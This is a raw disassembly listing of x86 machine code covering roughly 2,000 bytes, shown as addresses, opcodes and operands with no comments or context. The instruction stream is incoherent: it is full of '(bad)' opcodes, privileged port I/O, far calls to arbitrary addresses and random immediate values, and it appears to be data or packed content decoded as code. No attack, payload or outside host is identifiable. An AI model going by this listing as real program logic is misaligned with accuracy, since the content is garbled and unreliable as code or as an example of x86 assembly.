  4252ad:	and    ecx,DWORD PTR [esi+0x5126d246]
  4252b3:	into   
  4252b4:	mov    al,0x83
  4252b6:	or     DWORD PTR [eax+0xcf],0x397c920a
  4252c0:	cld    
  4252c1:	dec    DWORD PTR [edi-0x4d]
  4252c4:	in     al,dx
  4252c5:	jo     0x42527e
  4252c7:	lea    eax,ds:0xca0b2689
  4252cd:	retf   
  4252ce:	add    DWORD PTR [eax],eax
  4252d0:	test   DWORD PTR [edx],eax
  4252d2:	add    BYTE PTR [eax],al
  4252d4:	(bad)
  4252d8:	into   
  4252d9:	mov    WORD PTR [ecx],fs
  4252db:	leave  
  4252dc:	aas    
  4252dd:	add    dh,BYTE PTR [ebx]
  4252df:	add    ah,BYTE PTR [edi]
  4252e1:	daa    
  4252e2:	das    
  4252e3:	js     0x425333
  4252e5:	cmp    eax,0x716f8bf4
  4252ea:	cmp    edx,esi
  4252ec:	int3   
  4252ed:	xchg   cl,ch
  4252ef:	fwait
  4252f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252f1:	das    
  4252f2:	jne    0x4252fd
  4252f4:	adc    bl,BYTE PTR [ecx]
  4252f6:	sahf   
  4252f7:	mov    ds:0xb2ae5f39,eax
  4252fc:	pushf  
  4252fd:	scas   eax,DWORD PTR es:[edi]
  4252fe:	mov    al,bh
  425300:	jnp    0x4252b7
  425302:	mov    ebx,0xcfb38568
  425307:	mov    edi,0xd974b0ff
  42530c:	ja     0x425310
  42530e:	gs pushf 
  425310:	(bad)  
  425312:	add    eax,0xc2691e5f
  425317:	mov    dl,0xf9
  425319:	stc    
  42531a:	int    0x7a
  42531c:	imul   ebx,DWORD PTR [ebx+0x25e11f37],0x3b43f9ef
  425326:	popa   
  425327:	add    al,0x53
  425329:	fwait
  42532a:	pop    edx
  42532b:	push   es
  42532c:	popf   
  42532d:	mov    eax,0x7c1c21c6
  425332:	(bad)  
  425333:	int3   
  425334:	mov    esi,0xe7ed36b4
  425339:	dec    edx
  42533a:	pusha  
  42533b:	mov    ch,0xc1
  42533d:	cwde   
  42533e:	mov    esi,0xda36fad7
  425343:	pop    edx
  425344:	ins    BYTE PTR es:[edi],dx
  425345:	in     al,0x5d
  425347:	imul   edi,DWORD PTR [edx+0x1b],0x1
  42534b:	rol    BYTE PTR [edx+0x40e74724],0x87
  425352:	vandnps ymm5,ymm6,YMMWORD PTR ds:0x5e4f7a4c
  42535a:	sbb    BYTE PTR [ebx+0x1161fa6b],0x23
  425361:	shl    edx,1
  425363:	xor    BYTE PTR [ecx+0x11],dl
  425366:	loopne 0x4253a4
  425368:	inc    ebx
  425369:	in     al,0x23
  42536b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42536c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42536d:	fnstcw WORD PTR [edi-0x6ebd3518]
  425373:	xchg   ecx,eax
  425374:	ins    BYTE PTR es:[edi],dx
  425375:	pop    DWORD PTR [esp+ebx*4]
  425378:	jp     0x425324
  42537a:	add    dl,BYTE PTR [edx]
  42537c:	pop    esi
  42537d:	xchg   esi,eax
  42537f:	mov    bl,0x49
  425381:	inc    eax
  425382:	daa    
  425383:	jne    0x4253c1
  425385:	in     eax,0x5a
  425387:	aad    0xaa
  425389:	sbb    al,0xff
  42538b:	push   esp
  42538c:	sti    
  42538d:	inc    ebx
  42538e:	fnstenv [edi]
  425390:	mov    ebp,0x3f630619
  425395:	xchg   BYTE PTR [eax+ebp*8-0x8],cl
  425399:	xor    ecx,esp
  42539b:	or     eax,0x7c6a78b3
  4253a0:	mov    ecx,0xe73f3ed1
  4253a5:	lahf   
  4253a6:	lds    edx,FWORD PTR [ebx]
  4253a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253a9:	or     dh,BYTE PTR [ebx]
  4253ab:	(bad)
  4253ae:	jne    0x4253d7
  4253b0:	scas   al,BYTE PTR es:[edi]
  4253b1:	jle    0x4253b1
  4253b3:	aam    0x65
  4253b5:	mov    ds:0x2686b0fa,al
  4253ba:	test   al,0xe8
  4253bc:	out    0xb4,al
  4253be:	pop    cx
  4253c0:	les    eax,FWORD PTR ds:0xcb159a00
  4253c6:	stos   BYTE PTR es:[edi],al
  4253c7:	mov    ch,0x82
  4253c9:	sub    BYTE PTR ds:0x261c15ec,al
  4253cf:	in     al,dx
  4253d0:	mov    cl,0xd2
  4253d2:	push   es
  4253d3:	fstp   QWORD PTR [esi+0x61]
  4253d6:	jo     0x425446
  4253d8:	lods   al,BYTE PTR ds:[esi]
  4253d9:	lock pusha 
  4253db:	push   ds
  4253dc:	mov    al,0xc4
  4253de:	jno    0x425401
  4253e0:	inc    edi
  4253e1:	mov    dh,0x4b
  4253e3:	popa   
  4253e4:	retf   
  4253e5:	out    dx,eax
  4253e6:	push   ebp
  4253e7:	mov    ch,0xdf
  4253e9:	add    BYTE PTR [edx+0x44384690],al
  4253ef:	les    esi,FWORD PTR [edx+0x632019d9]
  4253f5:	add    BYTE PTR [ebx-0xa0c9fb3],cl
  4253fb:	sub    DWORD PTR [ebx-0x26],edi
  4253fe:	or     ah,BYTE PTR [edi]
  425400:	add    dh,BYTE PTR [edx+0x5bface1b]
  425406:	jnp    0x42542f
  425408:	xor    ebx,DWORD PTR [edi-0x3a]
  42540b:	ds sbb eax,0x49ae9757
  425411:	test   DWORD PTR [edi-0x38],esp
  425414:	xchg   ecx,eax
  425415:	stos   BYTE PTR es:[edi],al
  425416:	or     al,0x8e
  425418:	fdivr  DWORD PTR [ecx+ebp*8-0x4]
  42541c:	mov    al,ds:0x681defe6
  425421:	int    0x4f
  425423:	add    esi,edi
  425425:	out    dx,al
  425426:	jecxz  0x4253ad
  425428:	into   
  425429:	icebp  
  42542a:	(bad)  
  42542b:	and    ebp,esp
  42542d:	adc    al,0xd7
  42542f:	cwde   
  425430:	xlat   BYTE PTR ds:[ebx]
  425431:	test   BYTE PTR [edi+0x27],0xff
  425435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425436:	(bad)  
  425438:	mov    ebp,0x74e59c37
  42543d:	mov    dh,bh
  42543f:	(bad)  
  425440:	retf   0x4217
  425443:	pop    ss
  425444:	popa   
  425445:	mul    eax
  425447:	push   ebp
  425448:	mov    esi,0xfa113b52
  42544d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42544e:	nop
  42544f:	in     al,dx
  425450:	psrld  mm4,QWORD PTR [edx-0x216c74c2]
  425457:	out    0xd6,al
  425459:	cmp    dl,BYTE PTR [ecx-0x748cc6d2]
  42545f:	or     eax,0xdbb4c4db
  425464:	push   esi
  425465:	scas   eax,DWORD PTR es:[edi]
  425466:	aaa    
  425467:	push   eax
  425468:	inc    esp
  425469:	lahf   
  42546a:	(bad)  
  42546c:	bound  edi,QWORD PTR [ecx]
  42546e:	sub    dh,dh
  425470:	ds push esp
  425472:	sahf   
  425473:	add    al,0xbf
  425475:	mov    BYTE PTR [eax+0x1986ca52],al
  42547b:	fmul   QWORD PTR [edx+0x3]
  42547e:	or     DWORD PTR [esp+ebp*2+0x6d],esi
  425482:	rol    BYTE PTR [ebp-0x72570bd3],1
  425488:	push   ebx
  425489:	popa   
  42548a:	sub    al,0x2
  42548c:	pop    ebx
  42548d:	fisub  WORD PTR [eax-0x560a8f2b]
  425493:	rcr    DWORD PTR [eax+0x745f9598],0x28
  42549a:	mov    ds:0x1042a862,eax
  42549f:	mov    es,WORD PTR [eax-0x35442e28]
  4254a5:	rol    dl,1
  4254a7:	add    dh,cl
  4254a9:	iret   
  4254aa:	retf   0xc7c
  4254ad:	fcmovu st,st(1)
  4254af:	mov    edi,0xc2e47edf
  4254b4:	cli    
  4254b5:	mov    WORD PTR [ebx],?
  4254b7:	jg     0x425465
  4254b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254ba:	jp     0x42553b
  4254bc:	push   edi
  4254bd:	pop    ecx
  4254be:	mov    ebx,DWORD PTR [eax+0xd]
  4254c1:	add    eax,0x2e18c230
  4254c6:	sub    eax,0x1691cd5e
  4254cb:	dec    eax
  4254cc:	sti    
  4254cd:	outs   dx,DWORD PTR ds:[esi]
  4254ce:	ror    DWORD PTR [ebx+0x61fb421b],0x66
  4254d5:	or     bl,BYTE PTR [edx+ebp*2-0x28]
  4254d9:	pop    eax
  4254da:	push   0xdc144cbd
  4254df:	xor    eax,edx
  4254e1:	mov    ebp,0x66d012be
  4254e6:	cmp    BYTE PTR [eax+ecx*2],cl
  4254e9:	shl    BYTE PTR [edi+0x496ed86e],0xa2
  4254f0:	add    BYTE PTR [esi+esi*2+0x39674699],dl
  4254f7:	fsubr  DWORD PTR ds:0x916758ab
  4254fd:	push   ebp
  4254fe:	mov    dh,0xdd
  425500:	push   ds
  425501:	push   esp
  425502:	jbe    0x4254e5
  425504:	or     DWORD PTR ds:0x52fb1719,edi
  42550a:	pop    edi
  42550b:	dec    edi
  42550c:	mov    ds:0x9858ef9a,eax
  425511:	mov    eax,ds:0x9ca6ae87
  425516:	pop    ds
  425517:	lahf   
  425518:	aaa    
  425519:	outs   dx,BYTE PTR es:[esi]
  42551b:	cmp    dl,0x1e
  42551e:	xchg   ecx,eax
  42551f:	add    dh,BYTE PTR [edx-0x29]
  425522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425523:	outs   dx,DWORD PTR ds:[esi]
  425524:	xchg   ebx,eax
  425525:	sbb    al,0x56
  425527:	or     eax,0x77e49374
  42552c:	add    DWORD PTR [ebx],esp
  42552e:	push   edi
  42552f:	sbb    eax,0xfb7bee80
  425534:	and    DWORD PTR [eax-0x19],ebx
  425537:	adc    dh,BYTE PTR [ebx]
  425539:	inc    ebx
  42553a:	jbe    0x425585
  42553c:	sub    eax,0x2da987c2
  425541:	cmp    al,BYTE PTR [esi-0x27c08e9a]
  425547:	sbb    esi,ebx
  425549:	stos   BYTE PTR es:[edi],al
  42554a:	(bad)  [ebx+0x6bed33eb]
  425550:	scas   eax,DWORD PTR es:[edi]
  425551:	fcomp  st(5)
  425553:	and    BYTE PTR [ebx-0x6cf96a48],0x0
  42555a:	add    BYTE PTR [eax],al
  42555c:	ret    
  42555d:	and    ecx,edx
  42555f:	dec    eax
  425560:	repz clc 
  425562:	fld    TBYTE PTR [ebx+0x202892a0]
  425568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425569:	jmp    0x425587
  42556b:	and    ecx,DWORD PTR [edi-0x32]
  42556e:	add    DWORD PTR [eax],eax
  425570:	test   DWORD PTR [edx],eax
  425572:	add    BYTE PTR [eax],al
  425574:	or     eax,0x304608c2
  425579:	pop    ds
  42557a:	hlt    
  42557b:	inc    ecx
  42557c:	adc    al,al
  42557e:	and    BYTE PTR es:0x2e42da7a,dh
  425585:	mov    esp,0x6daf2420
  42558a:	add    ecx,DWORD PTR [esi-0x18]
  42558d:	mov    cl,0xae
  42558f:	dec    esi
  425590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425591:	nop
  425592:	or     BYTE PTR [edi+0x48],cl
  425595:	jg     0x4255aa
  425597:	xor    esp,DWORD PTR [ebx+0x53b8995]
  42559d:	xor    bl,BYTE PTR [ebx-0x2b]
  4255a0:	xlat   BYTE PTR ds:[ebx]
  4255a1:	ins    DWORD PTR es:[edi],dx
  4255a2:	jns    0x4255cc
  4255a4:	retf   0x76b8
  4255a7:	mov    cl,0x2e
  4255a9:	xor    cl,dl
  4255ab:	sahf   
  4255ac:	div    ebx
  4255ae:	jle    0x42559d
  4255b0:	jne    0x425533
  4255b2:	and    edi,edx
  4255b4:	ss fcmovnb st,st(1)
  4255b7:	jbe    0x42555a
  4255b9:	popf   
  4255ba:	rcl    cl,0x3f
  4255bd:	jns    0x4255f4
  4255bf:	adc    BYTE PTR [ebx-0xf474d81],ah
  4255c5:	mov    ds:0xaae076be,eax
  4255ca:	or     dl,BYTE PTR [ebx-0x7d]
  4255cd:	mov    edi,0x33d50e89
  4255d2:	out    0xcf,eax
  4255d4:	jle    0x42557a
  4255d6:	pop    esp
  4255d7:	and    al,0xc9
  4255d9:	repnz jecxz 0x4255b9
  4255dc:	gs xchg edx,eax
  4255de:	pop    edx
  4255df:	inc    edx
  4255e0:	popa   
  4255e1:	repnz add DWORD PTR [edi-0x4d],0x2100d1e0
  4255e9:	pop    ebx
  4255ea:	lods   eax,DWORD PTR ds:[esi]
  4255eb:	sti    
  4255ec:	cmc    
  4255ed:	add    al,0x8c
  4255ef:	popa   
  4255f0:	xchg   edx,eax
  4255f1:	lahf   
  4255f2:	call   0x585b7f81
  4255f7:	sub    ch,al
  4255f9:	mov    ?,WORD PTR [eax]
  4255fb:	inc    esp
  4255fc:	push   ebp
  4255fd:	sar    DWORD PTR [eax],0x3
  425600:	jo     0x4255ac
  425602:	test   al,0xd9
  425604:	push   edx
  425605:	sub    ecx,esi
  425607:	push   0x380b5b5c
  42560c:	std    
  42560d:	mov    edi,0xeb2e3dfc
  425612:	or     BYTE PTR [ebp-0x49],cl
  425615:	mov    ebp,0xfd2ab5b9
  42561a:	cwde   
  42561b:	mov    esi,0x409547da
  425620:	retf   
  425621:	jns    0x42568f
  425623:	les    edx,FWORD PTR [ecx]
  425625:	(bad)  
  425626:	ss mov eax,0x3c5e5197
  42562c:	ins    DWORD PTR es:[edi],dx
  42562d:	mov    ebx,0xd5fd638f
  425632:	sbb    DWORD PTR [ebx],edi
  425634:	jle    0x4256b0
  425636:	adc    al,BYTE PTR [ebx]
  425638:	addr16 mov ch,0xce
  42563b:	sub    eax,ebp
  42563d:	pop    eax
  42563e:	adc    BYTE PTR [ebp+esi*8-0x1d],dl
  425642:	jno    0x4255ee
  425644:	or     eax,0xb42583fa
  425649:	xchg   BYTE PTR [edx+0x208e70ea],ch
  42564f:	ds xchg edx,eax
  425651:	(bad)  
  425652:	sar    DWORD PTR [edx+0x1a],1
  425655:	cli    
  425656:	xchg   edi,eax
  425657:	and    DWORD PTR [ebx],ebp
  425659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42565a:	or     BYTE PTR [esp+ebp*1-0x27],ah
  42565e:	and    al,0x79
  425660:	fwait
  425661:	mov    eax,0xe04e4796
  425666:	fcmovu st,st(0)
  425668:	stc    
  425669:	jo     0x42561f
  42566b:	lods   eax,DWORD PTR ds:[esi]
  42566c:	dec    ebp
  42566d:	arpl   WORD PTR [esi],ax
  42566f:	out    dx,al
  425670:	dec    ecx
  425671:	jl     0x425667
  425673:	dec    esp
  425674:	sub    al,0x7a
  425676:	repz jge 0x425627
  425679:	daa    
  42567a:	into   
  42567b:	(bad)  
  42567c:	rcr    BYTE PTR [edx*8+0x593742d5],cl
  425683:	cwde   
  425684:	hlt    
  425685:	(bad)
  425688:	iret   
  425689:	test   DWORD PTR [ebx-0x3d776612],edx
  42568f:	fidivr DWORD PTR [esi-0x3f]
  425692:	pop    edi
  425693:	leave  
  425694:	mov    DWORD PTR [eax+edi*2],esp
  425697:	mov    al,0x41
  425699:	jle    0x42562e
  42569b:	mov    ecx,DWORD PTR [edx]
  42569d:	mov    BYTE PTR [ecx+0x7d],dh
  4256a0:	jo     0x42564d
  4256a2:	inc    ebx
  4256a3:	int    0x85
  4256a5:	inc    ebp
  4256a6:	and    edi,DWORD PTR [eax+0x44]
  4256a9:	arpl   WORD PTR cs:[ecx],ax
  4256ac:	call   0x853284dd
  4256b1:	and    al,0x8c
  4256b3:	in     al,0xd3
  4256b5:	and    edi,0xce1b7d5e
  4256bb:	adc    DWORD PTR [eax],esp
  4256bd:	inc    edi
  4256bf:	fidivr DWORD PTR [edi+0x62]
  4256c2:	outs   dx,BYTE PTR ds:[esi]
  4256c3:	add    bh,bh
  4256c5:	ss pop eax
  4256c7:	mov    ecx,0x5a00ff85
  4256cc:	test   BYTE PTR [esi],ch
  4256ce:	xor    al,0x1b
  4256d0:	and    DWORD PTR [ebx],ecx
  4256d2:	test   DWORD PTR [eax],ebp
  4256d4:	ja     0x425754
  4256d6:	or     al,0x49
  4256d8:	or     al,0x38
  4256da:	test   eax,0x19c1a039
  4256df:	dec    ebp
  4256e0:	aaa    
  4256e1:	inc    ebx
  4256e2:	and    edx,DWORD PTR [eax-0x644f7ca6]
  4256e8:	popa   
  4256e9:	cdq    
  4256ea:	dec    ecx
  4256eb:	ds pop ebx
  4256ed:	xchg   BYTE PTR ds:0x78b4c7fe,bh
  4256f3:	cld    
  4256f4:	fdiv   QWORD PTR [ebp-0x4e]
  4256f7:	add    DWORD PTR [edx],0x96fa548d
  4256fd:	bound  eax,QWORD PTR [eax-0xb78cc0f]
  425703:	adc    eax,0x2ba52de5
  425708:	xor    DWORD PTR [esi+0x41],edx
  42570b:	cmp    dh,BYTE PTR [esi]
  42570d:	xlat   BYTE PTR ds:[ebx]
  42570e:	bound  edx,QWORD PTR [esi+0x62]
  425711:	iret   
  425712:	es loope 0x425695
  425715:	dec    ecx
  425716:	mov    eax,ds:0xabfd54a
  42571b:	or     DWORD PTR [ebx],esi
  42571d:	mov    WORD PTR [eax-0x4fe10101],fs
  425723:	xchg   ebx,eax
  425724:	push   ss
  425725:	mov    ds:0x92ef04b4,eax
  42572a:	dec    edx
  42572b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42572c:	inc    esi
  42572d:	sti    
  42572e:	ret    
  42572f:	cmp    BYTE PTR [edi],bh
  425731:	fbld   TBYTE PTR [ebp+edx*1-0x35]
  425735:	cmp    DWORD PTR [ebx+0x5dddee89],0x270ddb8c
  42573f:	add    esi,DWORD PTR [ebx]
  425741:	lods   al,BYTE PTR ds:[esi]
  425742:	mov    DWORD PTR [ebx+edx*1-0x36],esp
  425746:	and    ebp,DWORD PTR [ebp+ebp*2+0x3b]
  42574a:	js     0x42572e
  42574c:	out    0xf1,al
  42574e:	add    ebp,ebp
  425750:	sbb    BYTE PTR [ebx+0x22],cl
  425753:	leave  
  425754:	setg   BYTE PTR [edi]
  425757:	push   ds
  425758:	lods   eax,DWORD PTR ds:[esi]
  425759:	or     al,0xec
  42575b:	aaa    
  42575c:	out    dx,eax
  42575d:	imul   esi,DWORD PTR [ecx-0x1a85a289],0xf6326d07
  425767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425768:	mov    al,ds:0xc11976cf
  42576d:	mov    WORD PTR ds:0x61446397,es
  425773:	pusha  
  425774:	inc    eax
  425775:	inc    edi
  425776:	lods   eax,DWORD PTR ds:[si]
  425778:	dec    ecx
  425779:	sahf   
  42577a:	mov    ebx,0xa8697238
  42577f:	pop    edi
  425780:	mov    gs,WORD PTR [edi]
  425782:	data16 mov ah,0x74
  425785:	cld    
  425786:	xchg   ebx,eax
  425787:	ficomp WORD PTR [esi+0x20]
  42578a:	add    BYTE PTR [ebp+0x74],al
  42578d:	mov    ?,WORD PTR [edi+0x43]
  425790:	push   es
  425791:	mov    ebp,0x811651ff
  425796:	loope  0x42572b
  425798:	test   DWORD PTR [ebx-0x112a49b6],0xdffbb94c
  4257a2:	dec    eax
  4257a3:	out    dx,al
  4257a4:	mov    esp,0x46c36443
  4257a9:	mov    cl,0xf2
  4257ab:	xor    DWORD PTR [edi+0x13],0x4a
  4257af:	push   0x89df46c0
  4257b4:	and    DWORD PTR [edi],edi
  4257b6:	loope  0x425826
  4257b8:	js     0x425830
  4257ba:	cdq    
  4257bb:	or     ah,BYTE PTR [edx-0xb]
  4257be:	enter  0xb72a,0x2a
  4257c2:	out    0xa7,al
  4257c4:	inc    esi
  4257c5:	pop    edx
  4257c6:	es sahf 
  4257c8:	into   
  4257c9:	inc    DWORD PTR ds:0xcfc26112
  4257cf:	and    DWORD PTR [edx-0x7c96168],0xffffff86
  4257d6:	(bad)  
  4257d7:	mov    bh,0x91
  4257d9:	pop    esi
  4257da:	mov    ds:0xbd15043e,al
  4257df:	push   eax
  4257e0:	xchg   ebx,eax
  4257e1:	iret   
  4257e2:	fsubp  st(7),st
  4257e4:	sti    
  4257e5:	pop    ss
  4257e6:	in     al,dx
  4257e7:	sbb    al,0x68
  4257e9:	jecxz  0x425788
  4257eb:	and    ebp,DWORD PTR [ebx]
  4257ed:	jl     0x4257d0
  4257ef:	out    0x35,eax
  4257f1:	ret    
  4257f2:	call   0x5653b5b7
  4257f7:	and    ax,0x0
  4257fb:	add    BYTE PTR [edx-0x101610a7],bl
  425801:	call   FWORD PTR [esi+0x5c5d437b]
  425807:	mov    cl,0xc7
  425809:	lds    eax,FWORD PTR ds:0x1d0d4d4
  42580f:	add    BYTE PTR [ebp+0x5a000002],al
  425815:	vpcmpgtb ymm6,ymm6,ymm0
  425819:	push   ebp
  42581b:	out    0x2e,eax
  42581d:	xor    al,0x60
  42581f:	ficomp DWORD PTR ds:[ebx+0x1bb47505]
  425826:	nop
  425827:	mov    al,BYTE PTR [eax+ebp*2]
  42582a:	iret   
  42582b:	test   BYTE PTR ds:0x3c84aa82,dh
  425831:	mov    ch,0x34
  425833:	ror    DWORD PTR [ebp+0xd],0x64
  425837:	cdq    
  425838:	fidivr WORD PTR [esi-0x10]
  42583b:	jnp    0x425846
  42583d:	mov    cl,0x84
  42583f:	ja     0x4258ba
  425841:	pop    ebp
  425842:	jge    0x4258b8
  425844:	adc    eax,0x5c61fac9
  425849:	sbb    bl,BYTE PTR [ebp-0x2f]
  42584c:	sbb    eax,0xa6c84dc4
  425851:	pusha  
  425852:	stos   DWORD PTR es:[edi],eax
  425853:	push   cs
  425854:	fwait
  425855:	cs inc esp
  425857:	out    dx,eax
  425858:	pusha  
  425859:	ss push ebp
  42585b:	add    BYTE PTR [esp+edx*2+0x6a5d8412],bh
  425862:	inc    ebx
  425863:	loope  0x425863
  425865:	fiadd  WORD PTR [ebp-0x30]
  425868:	cmp    bl,BYTE PTR [ebx-0x49d17617]
  42586e:	adc    bh,dh
  425870:	xchg   esi,eax
  425871:	push   ebx
  425872:	adc    al,0xca
  425874:	jae    0x42589b
  425876:	jmp    0x845b:0x685ffeef
  42587d:	test   eax,0xbcaf9398
  425883:	neg    BYTE PTR [edx]
  425885:	psubd  mm4,QWORD PTR [ecx-0x74]
  425889:	pop    ecx
  42588a:	cmp    eax,0x10db5204
  42588f:	fimul  DWORD PTR [ecx]
  425891:	pop    ds
  425892:	push   cs
  425893:	scas   eax,DWORD PTR es:[edi]
  425894:	int3   
  425895:	or     BYTE PTR [eax],bh
  425897:	gs xchg ecx,eax
  425899:	sar    DWORD PTR [ecx],0xd6
  42589c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42589d:	mov    cl,0x6e
  42589f:	iret   
  4258a0:	pushf  
  4258a1:	fs or  bh,bh
  4258a4:	mov    DWORD PTR [ebp-0x42e1a48a],ecx
  4258aa:	arpl   WORD PTR [esi],sp
  4258ac:	pop    ss
  4258ad:	pop    ss
  4258ae:	in     al,0xc6
  4258b0:	das    
  4258b1:	mov    ecx,0xee6683cb
  4258b6:	or     DWORD PTR [esp+ebp*2],0xffffffc2
  4258ba:	das    
  4258bb:	adc    BYTE PTR [esi-0x1f0f07d0],ah
  4258c1:	mov    ebx,0xe4a69c97
  4258c6:	call   0xd5c3:0xf35895ac
  4258cd:	popf   
  4258ce:	mov    DWORD PTR [eax+0x7a8717c1],ebx
  4258d4:	gs inc edx
  4258d6:	jmp    0x4258a5
  4258d8:	xor    DWORD PTR [eax+0x5810c056],ebp
  4258de:	jb     0x425954
  4258e0:	inc    edx
  4258e1:	pop    es
  4258e2:	adc    DWORD PTR [edi-0x7f],edi
  4258e5:	add    DWORD PTR [esp+edi*8+0x15],eax
  4258e9:	mov    al,0xaf
  4258eb:	xlat   BYTE PTR ds:[ebx]
  4258ec:	jge    0x42588d
  4258ee:	std    
  4258ef:	xor    BYTE PTR [edx-0x6f],al
  4258f2:	ror    DWORD PTR [ecx+0x6f97e970],0x16
  4258f9:	sti    
  4258fa:	outs   dx,BYTE PTR ds:[esi]
  4258fb:	xor    eax,0xc62ea84b
  425900:	in     eax,dx
  425901:	in     al,0x25
  425903:	mov    bl,al
  425905:	xchg   BYTE PTR [edi+0x7e],dh
  425908:	shl    BYTE PTR [ecx+0x2eb1e411],cl
  42590e:	test   eax,0xe6c22851
  425914:	inc    ecx
  425915:	shl    BYTE PTR [ecx+0xf3810d7],cl
  42591b:	add    al,0x37
  42591d:	fmul   QWORD PTR [ecx+0x5897e318]
  425923:	sbb    DWORD PTR [esi],esp
  425925:	ds push ds
  425927:	push   edx
  425928:	imul   DWORD PTR [edx+0x24]
  42592b:	dec    edx
  42592c:	mov    bl,0x8a
  42592e:	cli    
  42592f:	test   ebx,0x9c548f13
  425935:	and    eax,0xf6a93590
  42593a:	nop
  42593b:	stc    
  42593c:	mov    dh,dl
  42593e:	loope  0x4258fb
  425940:	repz add BYTE PTR [edx],bl
  425943:	je     0x42592e
  425945:	out    dx,al
  425946:	mov    BYTE PTR [ebx+0x21],0x6d
  42594a:	(bad)  
  42594b:	cld    
  42594c:	push   es
  42594d:	pop    ss
  42594e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42594f:	push   esp
  425950:	sub    eax,0x343b206c
  425955:	jg     0x425986
  425957:	jp     0x42595a
  425959:	sub    eax,0x28251fe4
  42595e:	mov    al,ds:0xfff95faf
  425963:	mov    ebx,0xab114c74
  425968:	lods   al,BYTE PTR ds:[esi]
  425969:	xchg   DWORD PTR [eax+ebx*4+0x40],ecx
  42596d:	enter  0xc53c,0xa
  425971:	xchg   esi,eax
  425972:	mov    al,0x8
  425974:	mov    eax,0x8fc9496b
  425979:	rcl    DWORD PTR [edx+eax*1+0x5f],1
  42597d:	mov    al,0x86
  42597f:	repz mov eax,0x4afcd3cf
  425985:	sbb    BYTE PTR [edx],bh
  425987:	lock out dx,al
  425989:	or     al,0xf6
  42598b:	dec    edi
  42598c:	retf   0xa459
  42598f:	sbb    ebx,DWORD PTR [eax]
  425991:	mov    eax,0x64efebdb
  425996:	mov    DWORD PTR [ecx-0xf3e67f6],eax
  42599c:	adc    al,0x7b
  42599e:	adc    BYTE PTR [ecx],dh
  4259a0:	xchg   edi,eax
  4259a1:	test   BYTE PTR [ecx+ecx*8+0x1f],bh
  4259a5:	clc    
  4259a6:	pop    edx
  4259a7:	leave  
  4259a8:	ror    ah,1
  4259aa:	and    esp,eax
  4259ac:	in     al,dx
  4259ad:	repz jecxz 0x425a0f
  4259b0:	mov    edi,0x180eddc1
  4259b5:	mov    ah,0xdc
  4259b7:	xchg   esi,eax
  4259b8:	mov    edi,0x576a8a47
  4259bd:	je     0x425a05
  4259bf:	lea    edx,[edx+0x22]
  4259c2:	xchg   ebx,eax
  4259c3:	in     eax,dx
  4259c4:	sahf   
  4259c5:	dec    edx
  4259c6:	push   edx
  4259c7:	push   ebp
  4259c8:	test   al,0x2d
  4259ca:	and    eax,ebp
  4259cc:	stos   BYTE PTR es:[edi],al
  4259cd:	dec    ebp
  4259ce:	call   0x37652c17
  4259d3:	adc    eax,DWORD PTR [ecx-0x3481b14f]
  4259d9:	jl     0x425a26
  4259db:	dec    edi
  4259dc:	div    eax
  4259de:	mov    eax,ds:0x1f32af57
  4259e3:	adc    dh,cl
  4259e5:	shl    BYTE PTR [ebp+0x52],0x8b
  4259e9:	rcr    DWORD PTR [edi+0x21431c3a],0xfa
  4259f0:	inc    edi
  4259f1:	mov    ebp,0xbf7292b8
  4259f6:	clc    
  4259f7:	loopne 0x4259fc
  4259f9:	dec    edi
  4259fa:	sar    DWORD PTR [eax-0x2d39c16f],cl
  425a00:	icebp  
  425a01:	push   cs
  425a02:	ss repnz push es
  425a05:	popf   
  425a06:	xor    DWORD PTR ds:0x54cbaee7,ecx
  425a0c:	cli    
  425a0d:	je     0x425a3e
  425a0f:	neg    BYTE PTR [ebx]
  425a11:	adc    DWORD PTR [eax],eax
  425a13:	scas   eax,DWORD PTR es:[edi]
  425a14:	enter  0x48a5,0x6f
  425a18:	xchg   esp,eax
  425a19:	lds    ebp,FWORD PTR ds:0x6ea76083
  425a1f:	sub    ch,BYTE PTR [esi]
  425a21:	punpckhbw mm7,QWORD PTR [ebx-0x69]
  425a25:	fs retf 0x4949
  425a29:	lods   al,BYTE PTR ds:[esi]
  425a2a:	lods   al,BYTE PTR ds:[esi]
  425a2b:	icebp  
  425a2c:	lea    esp,[edi-0x31]
  425a2f:	sub    ebx,DWORD PTR [eax+ecx*2+0x37b21cfd]
  425a36:	out    0xde,eax
  425a38:	out    dx,al
  425a39:	sub    eax,0x9d6d6171
  425a3e:	rcl    BYTE PTR [esi-0xd0cec45],0x35
  425a45:	pop    ss
  425a46:	mov    cl,0x30
  425a48:	jne    0x425aa3
  425a4a:	xchg   ecx,eax
  425a4b:	aas    
  425a4c:	xchg   edx,eax
  425a4d:	sub    al,0xdb
  425a4f:	fsub   QWORD PTR [ecx+0x66cf2fbe]
  425a55:	sti    
  425a56:	lds    ebp,FWORD PTR [eax+0x52bede04]
  425a5c:	xchg   DWORD PTR [ecx+0x536b4ce8],esi
  425a62:	hlt    
  425a63:	add    eax,0xc359267b
  425a68:	push   cs
  425a69:	jne    0x425a59
  425a6b:	and    al,0xd
  425a6d:	xchg   esi,eax
  425a6e:	sub    cl,dl
  425a70:	xchg   edx,eax
  425a71:	arpl   WORD PTR cs:[esi+0x28],bp
  425a75:	(bad)
  425a7a:	xchg   esi,eax
  425a7b:	bound  esi,QWORD PTR [edi]
  425a7d:	std    
  425a7e:	dec    edx
  425a7f:	mov    DWORD PTR [ecx+ecx*1-0x4f2f9f75],eax
  425a86:	nop
  425a87:	je     0x425a26
  425a89:	cs js  0x425a4f
  425a8c:	sub    eax,0x3927295e
  425a91:	lods   al,BYTE PTR ds:[esi]
  425a92:	jbe    0x425aa2
  425a94:	push   cs
